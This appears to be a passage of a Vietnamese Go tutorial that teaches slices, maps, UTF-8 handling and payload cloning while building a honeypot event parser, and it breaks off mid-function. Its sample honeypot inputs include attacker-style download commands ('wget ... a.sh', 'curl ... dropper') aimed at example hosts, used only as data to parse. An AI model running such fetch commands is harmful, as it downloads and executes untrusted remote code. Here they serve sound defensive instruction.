# Day 2 — Kiểu dữ liệu, slice, map, string và byte

## 1. Mục tiêu của ngày học

Sau khi hoàn thành tutorial này, bạn sẽ:

- Hiểu các kiểu số, `bool`, `string`, `byte` và `rune` thường dùng trong Go.
- Phân biệt array với slice.
- Hiểu `len`, `cap`, `append`, `copy` và backing array của slice.
- Truy cập và cắt slice an toàn, không panic khi input rỗng hoặc ngắn bất thường.
- Dùng map để đếm số event theo địa chỉ IP.
- Kiểm tra một key có tồn tại trong map bằng comma-ok idiom.
- Hiểu sự khác nhau giữa `string`, `[]byte` và `[]rune`.
- Biết vì sao `len(string)` không luôn bằng số ký tự hiển thị.
- Dùng các package `strings`, `bytes` và `strconv`.
- Parse một command đơn giản, trích URL và sao chép payload khỏi buffer nhận dữ liệu.

Thời gian đề xuất: **5–6 giờ**.

> Honeypot nhận dữ liệu mạng dưới dạng byte. Nếu không hiểu slice, backing array và encoding, parser rất dễ truy cập ngoài phạm vi, giữ lại buffer lớn không cần thiết hoặc diễn giải sai payload của client.

---

## 2. Sản phẩm cuối ngày

Ta sẽ xây một chương trình nhỏ nhận các event giả lập và thực hiện pipeline:

```text
raw []byte
    ↓ sao chép payload
string payload
    ↓ parse command
command + arguments
    ↓ tìm URL
event đã phân tích
    ↓ cập nhật map
số event theo IP
```

Ví dụ input:

```text
IP:      192.0.2.10
Payload: wget http://example.com/a.sh
```

Kết quả dự kiến:

```text
IP:       192.0.2.10
Command:  wget
Args:     [http://example.com/a.sh]
URL:      http://example.com/a.sh
IP Count: 1
```

Cấu trúc thư mục cuối bài:

```text
go_day2/
├── cmd/
│   └── payloadlab/
│       └── main.go
├── internal/
│   ├── counter/
│   │   ├── counter.go
│   │   └── counter_test.go
│   └── parser/
│       ├── parser.go
│       └── parser_test.go
├── day2_tutorial.md
└── go.mod
```

Tutorial chỉ tạo sẵn tài liệu. Bạn sẽ tự tạo code theo từng bước để ghi nhớ cú pháp và quan sát hành vi của Go.

---

## 3. Khởi tạo module cho Day 2

Mở PowerShell tại thư mục bài học:

```powershell
cd C:\Go_project\go_day2
go mod init honeypot-day2
```

Tạo các thư mục cần dùng:

```powershell
New-Item -ItemType Directory -Force cmd\payloadlab
New-Item -ItemType Directory -Force internal\parser
New-Item -ItemType Directory -Force internal\counter
```

Kiểm tra module:

```powershell
go env GOMOD
go list -m
```

Kết quả `go list -m` dự kiến:

```text
honeypot-day2
```

---

## 4. Kiểu số, boolean, string, byte và rune

### Kiểu số thường dùng

```go
var attempts int = 3
var port uint16 = 8080
var packetSize int64 = 4096
var score float64 = 0.95
```

- `int` thường dùng cho index, độ dài và số đếm trong bộ nhớ.
- `uint16` có miền giá trị phù hợp với port mạng, nhưng vẫn phải validate input trước khi chuyển kiểu.
- `int64` thường xuất hiện ở kích thước, timestamp hoặc API yêu cầu rõ 64 bit.
- `float64` phù hợp với điểm số hoặc tỷ lệ; không dùng số thực để đếm event.

Không chuyển một số chưa validate sang kiểu nhỏ hơn:

```go
rawPort := 70000
port := uint16(rawPort) // Bị wrap, không còn là 70000.
fmt.Println(port)
```

Validate trong một function trả về cả port và lỗi:

```go
func parsePort(rawPort int) (uint16, error) {
	if rawPort < 1 || rawPort > 65535 {
		return 0, fmt.Errorf("port out of range: %d", rawPort)
	}

	return uint16(rawPort), nil
}
```

Sử dụng kết quả và kiểm tra lỗi:

```go
port, err := parsePort(rawPort)
if err != nil {
	return err
}

fmt.Println(port)
```

### Boolean

```go
var parsed bool          // false
hasURL := true
```

`bool` thường biểu diễn trạng thái rõ ràng: parse thành công hay không, key có tồn tại hay không, payload có URL hay không.

### String

```go
command := "wget"
```

String trong Go:

- Là chuỗi byte bất biến.
- Có thể chứa text UTF-8 hợp lệ, nhưng Go không bắt buộc mọi string phải là UTF-8 hợp lệ.
- Không thể sửa trực tiếp một byte trong string.

Đoạn sau không compile:

```go
command[0] = 'W'
```

### Byte và rune

```go
var b byte = 'A' // byte là alias của uint8.
var r rune = 'ệ' // rune là alias của int32.
```

`byte` phù hợp với dữ liệu packet thô. `rune` biểu diễn một Unicode code point.

---

## 5. Array và slice

Array có độ dài cố định và độ dài là một phần của kiểu. `[4]byte` và `[8]byte` là hai kiểu khác nhau. Khi gán một array, Go sao chép toàn bộ giá trị. Slice là một view lên backing array; nhiều slice có thể cùng nhìn vào một vùng nhớ.

Tạo file tạm `array_slice_demo.go`:

```go
package main

import "fmt"

func main() {
	// Array: phép gán sao chép toàn bộ ba phần tử.
	arrayOriginal := [3]int{10, 20, 30}
	arrayCopy := arrayOriginal
	arrayCopy[0] = 99

	fmt.Println("array original:", arrayOriginal)
	fmt.Println("array copy:    ", arrayCopy)

	// Slice: sliceView và sliceOriginal dùng chung backing array.
	sliceOriginal := []int{10, 20, 30}
	sliceView := sliceOriginal[0:2]
	sliceView[0] = 99

	fmt.Println("slice original:", sliceOriginal)
	fmt.Println("slice view:    ", sliceView)
}
```

Chạy:

```powershell
go run .\array_slice_demo.go
```

Output:

```text
array original: [10 20 30]
array copy:     [99 20 30]
slice original: [99 20 30]
slice view:     [99 20]
```

Xóa file tạm sau khi thử để nó không xung đột với package khác trong module.

### Phân tích code

- `arrayOriginal := [3]int{...}` tạo một array có kiểu chính xác là `[3]int`. Số `3` thuộc về kiểu, không chỉ là metadata lúc chạy.
- `arrayCopy := arrayOriginal` sao chép cả ba phần tử. Hai biến array không chia sẻ dữ liệu, nên sửa `arrayCopy[0]` không ảnh hưởng `arrayOriginal`.
- `sliceOriginal := []int{...}` tạo một slice và backing array chứa ba số nguyên.
- `sliceView := sliceOriginal[0:2]` tạo slice header mới nhưng không sao chép hai phần tử. `sliceView` và `sliceOriginal` cùng trỏ vào backing array.
- Khi gán `sliceView[0] = 99`, chương trình sửa phần tử thật trong backing array. Vì vậy cả hai slice đều quan sát được giá trị `99`.
- Bài học cho honeypot: nếu hai event giữ các slice cùng trỏ vào buffer nhận dữ liệu, việc tái sử dụng buffer có thể âm thầm làm thay đổi payload của event cũ.

Về mặt khái niệm, slice lưu ba thông tin:

- Vị trí bắt đầu trong backing array.
- Length: số phần tử hiện được phép truy cập.
- Capacity: số phần tử tối đa có thể mở rộng từ vị trí bắt đầu.

---

## 6. `len`, `cap` và truy cập an toàn

Chỉ index nhỏ hơn `len` mới được truy cập. `cap` cho biết slice có thể mở rộng bao xa từ vị trí bắt đầu trong backing array.

Chương trình hoàn chỉnh sau minh họa cách cắt slice an toàn, kể cả khi input rỗng hoặc độ dài do client khai báo không hợp lệ:

```go
package main

import "fmt"

func firstN(data []byte, n int) []byte {
	if n <= 0 || len(data) == 0 {
		return nil
	}

	if n > len(data) {
		n = len(data)
	}

	return data[:n]
}

func payloadByDeclaredLength(packet []byte, declaredLength int) ([]byte, error) {
	if declaredLength < 0 || declaredLength > len(packet) {
		return nil, fmt.Errorf(
			"invalid payload length %d for packet length %d",
			declaredLength,
			len(packet),
		)
	}

	return packet[:declaredLength], nil
}

func main() {
	data := make([]byte, 4, 8)
	copy(data, []byte("ABCD"))

	fmt.Printf("data=%q len=%d cap=%d\n", data, len(data), cap(data))
	fmt.Printf("firstN(data, 2)=%q\n", firstN(data, 2))
	fmt.Printf("firstN(data, 99)=%q\n", firstN(data, 99))
	fmt.Printf("firstN(nil, 2)=%q\n", firstN(nil, 2))

	body, err := payloadByDeclaredLength(data, 3)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Printf("body=%q\n", body)

	_, err = payloadByDeclaredLength(data, 10)
	if err != nil {
		fmt.Println("rejected:", err)
	}
}
```

Output chính:

```text
data="ABCD" len=4 cap=8
firstN(data, 2)="AB"
firstN(data, 99)="ABCD"
firstN(nil, 2)=""
body="ABC"
rejected: invalid payload length 10 for packet length 4
```

### Phân tích code

- `make([]byte, 4, 8)` tạo slice có thể truy cập bốn phần tử nhưng backing array còn chỗ cho tối đa tám phần tử tính từ vị trí bắt đầu.
- `copy(data, []byte("ABCD"))` ghi bốn byte vào vùng hợp lệ `data[0:4]`. `copy` tự giới hạn theo chiều dài của source và destination.
- `firstN` xử lý `n <= 0` và slice rỗng trước. Vì vậy function không bao giờ tạo một slice bound âm hoặc truy cập phần tử không tồn tại.
- Khi `n > len(data)`, function hạ `n` xuống `len(data)`. Input `99` vì thế trả toàn bộ dữ liệu thay vì panic.
- `payloadByDeclaredLength` trả `([]byte, error)` vì độ dài do client khai báo có thể sai. Nhánh lỗi trả `nil` kèm thông tin đủ để điều tra.
- `packet[:declaredLength]` chỉ được thực hiện sau khi đã chứng minh `0 <= declaredLength <= len(packet)`.
- `body` vẫn chia sẻ backing array với `packet`. Nếu cần lưu `body` lâu hoặc buffer sẽ được tái sử dụng, phải clone ở bước tiếp theo.

Không viết `payload[0]` trước khi biết `len(payload) > 0`, và không dùng số do client gửi làm slice bound trước khi validate.

---

## 7. `append` và thay đổi backing array

`append` trả về một slice, vì vậy luôn nhận lại kết quả. Nếu capacity còn đủ, nó có thể ghi vào backing array hiện tại; nếu không đủ, Go cấp phát backing array mới.

```go
package main

import "fmt"

func main() {
	values := make([]int, 0, 2)

	values = append(values, 10)
	fmt.Printf("values=%v len=%d cap=%d\n", values, len(values), cap(values))

	values = append(values, 20)
	fmt.Printf("values=%v len=%d cap=%d\n", values, len(values), cap(values))

	values = append(values, 30)
	fmt.Printf("values=%v len=%d cap=%d\n", values, len(values), cap(values))

	// part còn capacity nên append ghi vào backing array của original.
	original := []int{1, 2, 3, 4}
	part := original[:2]
	part = append(part, 99)

	fmt.Println("original after shared append:", original)
	fmt.Println("part:                        ", part)

	// Clone trước khi append để không sửa original.
	independent := append([]int(nil), original[:2]...)
	independent = append(independent, 77)

	fmt.Println("original after cloned append:", original)
	fmt.Println("independent:                 ", independent)
}
```

Phần đầu output có capacity phụ thuộc implementation, nên chỉ dựa vào các điều kiện `len`/`cap` cần thiết, không dựa vào một chiến lược tăng capacity cụ thể. Phần chia sẻ backing array có kết quả:

```text
original after shared append: [1 2 99 4]
part:                         [1 2 99]
original after cloned append: [1 2 99 4]
independent:                  [1 2 77]
```

### Phân tích code

- `make([]int, 0, 2)` tạo slice rỗng nhưng chuẩn bị capacity cho hai phần tử. Không phần tử nào được truy cập trước khi append.
- Mỗi lần `append`, kết quả được gán lại vào `values`. Đây là bắt buộc vì `append` có thể trả slice header mới trỏ tới backing array mới.
- Hai lần append đầu có thể dùng capacity đã chuẩn bị. Lần thứ ba buộc runtime bảo đảm chỗ cho ít nhất ba phần tử, nhưng capacity mới chính xác bao nhiêu là chi tiết implementation.
- `part := original[:2]` có `len=2` nhưng vẫn còn capacity trong backing array của `original`.
- `append(part, 99)` dùng vị trí backing array kế tiếp, vốn đang chứa `original[2]`. Vì vậy số `3` bị ghi đè thành `99`.
- `append([]int(nil), original[:2]...)` sao chép hai phần tử sang backing array độc lập. Append `77` vào `independent` không thể sửa `original`.
- Khi xử lý packet, hãy đặc biệt cẩn thận với pattern “cắt một phần rồi append”, vì nó có thể sửa dữ liệu ở phần còn lại của packet gốc.

---

## 8. `copy` và sao chép slice độc lập

`copy` sao chép tối đa số phần tử vừa với cả source và destination. Muốn clone đầy đủ, destination phải có `len` bằng `len(source)`.

```go
package main

import "fmt"

func clonePayload(payload []byte) []byte {
	if payload == nil {
		return nil
	}

	cloned := make([]byte, len(payload))
	copy(cloned, payload)
	return cloned
}

func main() {
	source := []byte("payload")

	fullCopy := make([]byte, len(source))
	fullCount := copy(fullCopy, source)

	shortCopy := make([]byte, 3)
	shortCount := copy(shortCopy, source)

	cloned := clonePayload(source)
	source[0] = 'P'

	fmt.Printf("full copy:  %q, copied=%d\n", fullCopy, fullCount)
	fmt.Printf("short copy: %q, copied=%d\n", shortCopy, shortCount)
	fmt.Printf("source:     %q\n", source)
	fmt.Printf("clone:      %q\n", cloned)
}
```

Output:

```text
full copy:  "payload", copied=7
short copy: "pay", copied=3
source:     "Payload"
clone:      "payload"
```

### Phân tích code

- `fullCopy := make([]byte, len(source))` cấp phát destination vừa đủ. `copy` trả `7` vì cả bảy byte đều được sao chép.
- `shortCopy` chỉ có chiều dài `3`, nên `copy` dừng sau ba byte và trả `3`; nó không tự tăng destination.
- `clonePayload` phân biệt input `nil`: input `nil` trả `nil`, còn payload không nil được cấp backing array riêng.
- `copy(cloned, payload)` sao chép nội dung, không sao chép slice header. Sau lệnh này hai slice không chia sẻ backing array.
- Việc đổi `source[0]` thành `'P'` chỉ sửa source. Output `clone="payload"` chứng minh bản clone độc lập.
- Giá trị trả về của `copy` hữu ích khi destination có kích thước cố định; hãy kiểm tra nó nếu chương trình yêu cầu sao chép đủ dữ liệu.

Có thể clone ngắn bằng `append([]byte(nil), payload...)`, nhưng `make` và `copy` thể hiện ý định rõ ràng hơn trong bài này.

---

## 9. Vì sao honeypot phải sao chép payload?

Chương trình sau cho thấy một slice dài 20 byte vẫn có thể giữ tham chiếu tới backing array 1 MiB. Bản clone có capacity đúng bằng kích thước dữ liệu cần lưu và không thay đổi khi buffer được tái sử dụng.

```go
package main

import "fmt"

func clonePayload(payload []byte) []byte {
	if payload == nil {
		return nil
	}

	cloned := make([]byte, len(payload))
	copy(cloned, payload)
	return cloned
}

func main() {
	buffer := make([]byte, 1024*1024)
	message := []byte("wget /tmp/file123456") // Đúng 20 byte.
	copy(buffer, message)

	view := buffer[:len(message)]
	stored := clonePayload(view)

	fmt.Printf("view:   len=%d cap=%d data=%q\n", len(view), cap(view), view)
	fmt.Printf("stored: len=%d cap=%d data=%q\n", len(stored), cap(stored), stored)

	// Giả lập server tái sử dụng buffer cho lần đọc tiếp theo.
	buffer[0] = 'X'
	fmt.Printf("view after buffer reuse:   %q\n", view)
	fmt.Printf("stored after buffer reuse: %q\n", stored)
}
```

Mẫu helper dùng với `net.Conn`:

```go
package payload

import (
	"errors"
	"net"
)

func clonePayload(payload []byte) []byte {
	if payload == nil {
		return nil
	}

	cloned := make([]byte, len(payload))
	copy(cloned, payload)
	return cloned
}

// readPayload trả cả payload đã đọc và lỗi Read.
// Caller phải xử lý payload trước nếu len(payload) > 0, kể cả khi err != nil.
func readPayload(conn net.Conn, buffer []byte) ([]byte, error) {
	if conn == nil {
		return nil, errors.New("connection is nil")
	}
	if len(buffer) == 0 {
		return nil, errors.New("read buffer is empty")
	}

	n, err := conn.Read(buffer)
	return clonePayload(buffer[:n]), err
}
```

Theo contract của `io.Reader`, một lần đọc có thể trả đồng thời `n > 0` và `err != nil`; caller phải xử lý `n` byte trước khi kết thúc vì lỗi.

### Phân tích code

- `buffer := make([]byte, 1024*1024)` cấp backing array 1 MiB. Slice `view` chỉ dài 20 byte nhưng `cap(view)` vẫn phản ánh phần lớn vùng nhớ còn lại.
- Nếu lưu `view` vào event, tham chiếu từ event khiến garbage collector chưa thể thu hồi backing array 1 MiB.
- `stored := clonePayload(view)` cấp một backing array mới chỉ đủ cho 20 byte cần lưu. Đây vừa là tối ưu vòng đời bộ nhớ, vừa bảo vệ tính toàn vẹn dữ liệu.
- Khi `buffer[0] = 'X'`, `view` thay đổi vì nó nhìn vào buffer; `stored` không đổi vì đã tách khỏi buffer.
- Trong `readPayload`, check `conn == nil` và `len(buffer) == 0` biến lỗi lập trình thành `error` rõ ràng thay vì panic hoặc hành vi khó hiểu.
- `conn.Read(buffer)` trả số byte hợp lệ trong `buffer[:n]`. Helper clone đúng vùng này, không clone toàn bộ capacity của buffer.
- Function trả payload cùng `err` thay vì bỏ một trong hai. Caller nên xử lý payload khi `len(payload) > 0`, sau đó mới quyết định đóng kết nối hoặc ghi log lỗi.
- Clone giải quyết quyền sở hữu bộ nhớ, nhưng không giải quyết framing: dữ liệu của một command vẫn có thể nằm ở nhiều lần `Read`.

Một lần `Read` không đảm bảo nhận trọn một command hoặc một protocol frame. Việc ghép nhiều lần đọc thuộc bài networking/parser sau; hôm nay chỉ tập trung vào quản lý byte an toàn.

---

## 10. Map và kiểm tra key tồn tại

Chương trình hoàn chỉnh dưới đây khởi tạo map trước khi ghi, dùng comma-ok để kiểm tra key và đóng gói map để caller không sửa trực tiếp.

```go
package main

import "fmt"

type eventCounter struct {
	counts map[string]int
}

func newEventCounter() *eventCounter {
	return &eventCounter{
		counts: make(map[string]int),
	}
}

func (c *eventCounter) add(ip string) (int, bool) {
	if c == nil || ip == "" {
		return 0, false
	}

	// Lazy initialization giữ method an toàn cả với &eventCounter{}.
	if c.counts == nil {
		c.counts = make(map[string]int)
	}

	c.counts[ip]++
	return c.counts[ip], true
}

func (c *eventCounter) count(ip string) (int, bool) {
	if c == nil {
		return 0, false
	}

	count, exists := c.counts[ip]
	return count, exists
}

func (c *eventCounter) remove(ip string) {
	if c == nil {
		return
	}

	delete(c.counts, ip)
}

func main() {
	counter := newEventCounter()

	first, added := counter.add("192.0.2.10")
	second, _ := counter.add("192.0.2.10")
	_, emptyAdded := counter.add("")

	fmt.Println("first add: ", first, added)
	fmt.Println("second add:", second)
	fmt.Println("empty IP added:", emptyAdded)

	count, exists := counter.count("192.0.2.10")
	fmt.Println("known IP:  ", count, exists)

	count, exists = counter.count("203.0.113.7")
	fmt.Println("missing IP:", count, exists)

	counter.remove("192.0.2.10")
	_, exists = counter.count("192.0.2.10")
	fmt.Println("exists after remove:", exists)
}
```

Output:

```text
first add:  1 true
second add: 2
empty IP added: false
known IP:   2 true
missing IP: 0 false
exists after remove: false
```

### Phân tích code

- `eventCounter` giữ map ở field unexported `counts`, nên code bên ngoài không thể ghi trực tiếp và phá invariant của counter.
- `newEventCounter` khởi tạo map bằng `make`. Đây là trạng thái bình thường để gọi `add` ngay lập tức.
- Receiver của `add` là pointer vì method cần thay đổi map và có thể lazy-initialize field `counts`.
- Check `c == nil` phải đứng trước `c.counts`; nếu đảo thứ tự, việc dereference nil pointer sẽ panic.
- IP rỗng bị từ chối và trả `false`, tránh gom các event không xác định vào cùng key `""` ngoài ý muốn.
- `c.counts[ip]++` hoạt động cả khi key chưa tồn tại: lần đọc nội bộ nhận zero value `0`, sau đó tăng thành `1`.
- `count, exists := c.counts[ip]` phân biệt key vắng mặt với key tồn tại có giá trị `0`.
- `delete` không báo lỗi nếu key không tồn tại, nên `remove` không cần kiểm tra key trước.
- Counter này chưa an toàn cho nhiều goroutine cùng ghi. Việc đóng gói map giúp sau này có thể thêm mutex mà không đổi API gọi từ bên ngoài.

Đọc key không tồn tại trả zero value của value type. Vì `0` có thể là giá trị hợp lệ, luôn dùng `count, exists := counts[ip]` khi cần biết key có thật sự tồn tại hay không. Đọc nil map an toàn, nhưng ghi vào nil map sẽ panic.

### Concurrency

Map thường không an toàn khi nhiều goroutine cùng ghi. Bài hôm nay dùng một goroutine. Khi chuyển sang server đồng thời, cần bảo vệ map bằng mutex hoặc thiết kế một goroutine sở hữu map.

---

## 11. String, `[]byte` và `[]rune`

Chương trình sau minh họa đầy đủ byte, rune, vị trí byte khi dùng `range` và dữ liệu UTF-8 không hợp lệ:

```go
package main

import (
	"fmt"
	"unicode/utf8"
)

func main() {
	text := "Việt"
	raw := []byte(text)
	runes := []rune(text)

	fmt.Printf("text=%q\n", text)
	fmt.Printf("bytes=%v\n", raw)
	fmt.Printf("runes=%U\n", runes)
	fmt.Printf("len(string)=%d bytes\n", len(text))
	fmt.Printf("rune count=%d\n", utf8.RuneCountInString(text))

	for byteIndex, r := range text {
		fmt.Printf(
			"byteIndex=%d rune=%q codePoint=%U\n",
			byteIndex,
			r,
			r,
		)
	}

	invalidPayload := []byte{0xff, 0xfe, 'A'}
	fmt.Printf("valid UTF-8=%t raw=%v\n", utf8.Valid(invalidPayload), invalidPayload)
}
```

Output chính:

```text
text="Việt"
bytes=[86 105 225 187 135 116]
runes=[U+0056 U+0069 U+1EC7 U+0074]
len(string)=6 bytes
rune count=4
byteIndex=0 rune='V' codePoint=U+0056
byteIndex=1 rune='i' codePoint=U+0069
byteIndex=2 rune='ệ' codePoint=U+1EC7
byteIndex=5 rune='t' codePoint=U+0074
valid UTF-8=false raw=[255 254 65]
```

### Phân tích code

- `text` chứa UTF-8. `[]byte(text)` cho thấy biểu diễn thật trong bộ nhớ: `ệ` cần ba byte, trong khi các ký tự ASCII chỉ cần một byte.
- `len(text)` vì thế trả `6`, không phải `4`. Go định nghĩa `len(string)` là số byte.
- `[]rune(text)` giải mã UTF-8 thành các Unicode code point. `utf8.RuneCountInString` đếm cùng cấp độ mà không cần giữ slice rune lâu dài.
- Khi `range` qua string, biến thứ nhất là byte index. Sau rune `ệ`, index nhảy từ `2` lên `5` vì rune đó chiếm ba byte.
- `%q` hiển thị rune có quote dễ đọc; `%U` hiển thị mã Unicode, hữu ích khi debug ký tự khó quan sát.
- `utf8.Valid(invalidPayload)` cho phép kiểm tra trước khi coi packet là text. Hai byte `0xff` và `0xfe` không hợp lệ trong UTF-8 nên kết quả là `false`.
- Không nên chuyển payload thành rune rồi bỏ byte gốc: việc giải mã input lỗi có thể sinh Unicode replacement character và làm mất chi tiết evidence.
- Số rune vẫn không chắc bằng số ký tự hiển thị, vì một grapheme có thể được ghép từ nhiều code point.

- Dùng `[]byte` khi nhận, cắt, sao chép hoặc so sánh packet thô.
- Dùng `string` khi dữ liệu được xem là text, làm key map hoặc dùng package `strings`.
- Dùng `rune` khi cần làm việc theo Unicode code point.
- Chuyển đổi `string` ↔ `[]byte` thường tạo bản dữ liệu mới; tránh chuyển đổi lặp lại không cần thiết.

### Rune vẫn chưa luôn bằng ký tự hiển thị

Một ký tự hiển thị có thể gồm nhiều Unicode code point, ví dụ chữ cái kết hợp với dấu hoặc một emoji ghép bằng zero-width joiner. Vì vậy:

- `len(s)` đếm byte.
- `utf8.RuneCountInString(s)` đếm Unicode code point.
- Số ký tự hiển thị thực tế là số grapheme cluster và cần xử lý Unicode ở mức cao hơn.

Đây là câu trả lời cần nắm chắc cho tiêu chí: **`len(string)` không luôn bằng số ký tự hiển thị vì string được đo theo byte, trong khi UTF-8 có ký tự dùng nhiều byte; ngoài ra một ký tự hiển thị còn có thể gồm nhiều rune.**

Attacker có thể gửi byte không tạo thành UTF-8 hợp lệ. Không mặc định mọi network payload là text; hãy giữ `[]byte` gốc làm evidence và chỉ parse text ở nơi phù hợp.

---

## 12. Package `strings`, `bytes` và `strconv`

Ví dụ hoàn chỉnh dưới đây dùng `bytes` cho payload thô, `strings` cho command text và `strconv` để parse cấu hình dạng chuỗi:

```go
package main

import (
	"bytes"
	"fmt"
	"strconv"
	"strings"
)

func main() {
	rawPayload := []byte("  WGET   http://example.com/a.sh\r\n")
	trimmedPayload := bytes.TrimSpace(rawPayload)

	if !bytes.Contains(trimmedPayload, []byte("http://")) {
		fmt.Println("payload does not contain an HTTP URL")
		return
	}

	fields := strings.Fields(string(trimmedPayload))
	if len(fields) == 0 {
		fmt.Println("empty command")
		return
	}

	command := strings.ToLower(fields[0])
	args := append([]string(nil), fields[1:]...)

	port, err := strconv.Atoi("8080")
	if err != nil {
		fmt.Println("invalid port:", err)
		return
	}
	if port < 1 || port > 65535 {
		fmt.Printf("port out of range: %d\n", port)
		return
	}

	enabled, err := strconv.ParseBool("true")
	if err != nil {
		fmt.Println("invalid enabled flag:", err)
		return
	}

	maxPayload, err := strconv.ParseInt("4096", 10, 64)
	if err != nil {
		fmt.Println("invalid payload size:", err)
		return
	}

	fmt.Printf("command=%s args=%v\n", command, args)
	fmt.Printf(
		"port=%s enabled=%t maxPayload=%d\n",
		strconv.Itoa(port),
		enabled,
		maxPayload,
	)
}
```

Output:

```text
command=wget args=[http://example.com/a.sh]
port=8080 enabled=true maxPayload=4096
```

### Phân tích code

- `rawPayload` bắt đầu dưới dạng `[]byte`, giống dữ liệu server nhận từ network.
- `bytes.TrimSpace` loại space, CR và LF ở hai đầu mà chưa cần chuyển toàn bộ pipeline sang string. Kết quả có thể vẫn chia sẻ backing array với `rawPayload`.
- `bytes.Contains` thực hiện kiểm tra sơ bộ trên byte. Đây chưa phải URL validation; nó chỉ minh họa lựa chọn API theo kiểu dữ liệu hiện có.
- Chương trình chỉ chuyển `trimmedPayload` sang string tại ranh giới parser text.
- `strings.Fields` chuẩn hóa một hoặc nhiều whitespace. Check `len(fields) == 0` bắt buộc phải xảy ra trước `fields[0]`.
- `strings.ToLower(fields[0])` chuẩn hóa tên command để `WGET` và `wget` có thể được thống kê cùng một key.
- `append([]string(nil), fields[1:]...)` tạo slice arguments độc lập với slice `fields`.
- `strconv.Atoi` parse chuỗi port thành `int`; sau khi parse vẫn cần validate miền nghiệp vụ `1..65535`.
- `strconv.ParseBool` và `strconv.ParseInt` đều trả `error`, nên mỗi conversion được kiểm tra riêng và dừng sớm khi thất bại.
- Tham số `10` trong `ParseInt("4096", 10, 64)` yêu cầu hệ thập phân; `64` giới hạn kết quả theo miền `int64`.
- `strconv.Itoa(port)` chuyển số nguyên về text mà không dùng `fmt.Sprintf` khi chỉ cần conversion đơn giản.

Vai trò từng package:

- `bytes`: xử lý dữ liệu đang ở dạng `[]byte`, ví dụ trim, tìm prefix hoặc so sánh packet.
- `strings`: xử lý dữ liệu text, ví dụ `Fields`, `TrimSpace`, `HasPrefix`, `Contains`, `ToLower`.
- `strconv`: chuyển giữa string và số/boolean mà không dùng format parser nặng hơn.

`bytes.TrimSpace` có thể trả một subslice dùng chung backing array với input. Nếu cần lưu kết quả lâu hơn vòng đời buffer nhận dữ liệu, hãy clone nó. Không bỏ qua lỗi từ `Atoi`, `ParseBool` hoặc `ParseInt` khi input đến từ bên ngoài.

---

## 13. Bài 1 — Parse command và arguments

Tạo `internal/parser/parser.go`:

```go
package parser

import "strings"

// Command là kết quả parse một command line đơn giản.
type Command struct {
	Name string
	Args []string
}

// ParseCommand tách command và arguments theo khoảng trắng.
// Giá trị bool bằng false nếu input rỗng hoặc chỉ có whitespace.
func ParseCommand(input string) (Command, bool) {
	fields := strings.Fields(input)
	if len(fields) == 0 {
		return Command{}, false
	}

	return Command{
		Name: fields[0],
		Args: append([]string(nil), fields[1:]...),
	}, true
}
```

Điểm an toàn quan trọng:

- Kiểm tra `len(fields) == 0` trước `fields[0]`.
- `fields[1:]` hợp lệ khi `len(fields) == 1`; kết quả là slice rỗng.
- Clone `Args` để kết quả không giữ các phần tử không cần thiết trong slice `fields`.

Giới hạn của parser:

```text
echo "hello world"
```

`strings.Fields` không hiểu shell quoting, escaping, redirect hoặc pipe. Đây là chủ ý của parser đơn giản. Không chạy input của attacker qua shell thật để “parse” vì điều đó có thể thực thi command.

---

## 14. Bài 2 — Trích URL

Thêm vào `internal/parser/parser.go`:

```go
// ExtractURL trả URL HTTP/HTTPS đầu tiên trong arguments.
func ExtractURL(command Command) (string, bool) {
	for _, argument := range command.Args {
		if strings.HasPrefix(argument, "http://") ||
			strings.HasPrefix(argument, "https://") {
			return argument, true
		}
	}

	return "", false
}
```

Ví dụ:

```go
command, ok := parser.ParseCommand("wget http://example.com/a.sh")
if !ok {
	fmt.Println("empty command")
	return
}

targetURL, found := parser.ExtractURL(command)
if !found {
	fmt.Println("URL not found")
	return
}

fmt.Println(targetURL)
```

Đây chỉ là nhận diện theo prefix, chưa xác minh host hoặc cú pháp đầy đủ. Bài mở rộng có thể dùng `net/url`, nhưng luôn giữ payload gốc vì dữ liệu sai cú pháp vẫn có giá trị điều tra.

---

## 15. Bài 3 — Đếm event theo IP

Tạo `internal/counter/counter.go`:

```go
package counter

// EventCounter đếm số event theo địa chỉ IP.
type EventCounter struct {
	counts map[string]int
}

func New() *EventCounter {
	return &EventCounter{
		counts: make(map[string]int),
	}
}

// Add tăng bộ đếm và trả về giá trị mới.
func (c *EventCounter) Add(ip string) int {
	if c == nil || ip == "" {
		return 0
	}

	c.counts[ip]++
	return c.counts[ip]
}

// Count trả số event và cho biết IP đã tồn tại hay chưa.
func (c *EventCounter) Count(ip string) (int, bool) {
	if c == nil {
		return 0, false
	}

	count, exists := c.counts[ip]
	return count, exists
}
```

Thiết kế này không export map nên caller không thể vô tình ghi trực tiếp hoặc thay map bên trong.

> `EventCounter` hiện chỉ dùng tuần tự. Chưa chia sẻ nó giữa nhiều goroutine cho đến khi thêm cơ chế đồng bộ ở bài concurrency.

---

## 16. Bài 4 — Sao chép payload

Thêm vào `internal/parser/parser.go`:

```go
// ClonePayload tạo backing array độc lập với input.
func ClonePayload(payload []byte) []byte {
	if payload == nil {
		return nil
	}

	cloned := make([]byte, len(payload))
	copy(cloned, payload)
	return cloned
}
```

Test tư duy:

```go
original := []byte("attack")
cloned := ClonePayload(original)

original[0] = 'X'

fmt.Println(string(original)) // Xttack
fmt.Println(string(cloned))   // attack
```

Nếu `cloned` đổi theo `original`, hàm chưa thực sự clone dữ liệu.

---

## 17. Viết chương trình tổng hợp

Tạo `cmd/payloadlab/main.go`:

```go
package main

import (
	"fmt"

	"honeypot-day2/internal/counter"
	"honeypot-day2/internal/parser"
)

type inputEvent struct {
	IP      string
	Payload []byte
}

type parsedEvent struct {
	IP      string
	Payload []byte
	Command string
	Args    []string
	URL     string
	Count   int
}

func main() {
	inputs := []inputEvent{
		{IP: "192.0.2.10", Payload: []byte("wget http://example.com/a.sh")},
		{IP: "192.0.2.10", Payload: []byte("curl https://example.org/dropper")},
		{IP: "198.51.100.5", Payload: []byte("whoami")},
		{IP: "203.0.113.7", Payload: []byte("")},
		{IP: "", Payload: []byte("wget http://invalid.example/file")},
	}

	counts := counter.New()

	for _, input := range inputs {
		event, ok := processEvent(input, counts)
		if !ok {
			fmt.Printf("ignored: ip=%q payload=%q\n", input.IP, input.Payload)
			continue
		}

		fmt.Printf(
			"ip=%s command=%s args=%v url=%q count=%d\n",
			event.IP,
			event.Command,
			event.Args,
			event.URL,
			event.Count,
		)
	}
}

func processEvent(input inputEvent, counts *counter.EventCounter) (parsedEvent, bool) {
	if input.IP == "" {
		return parsedEvent{}, false
	}

	payload := parser.ClonePayload(input.Payload)
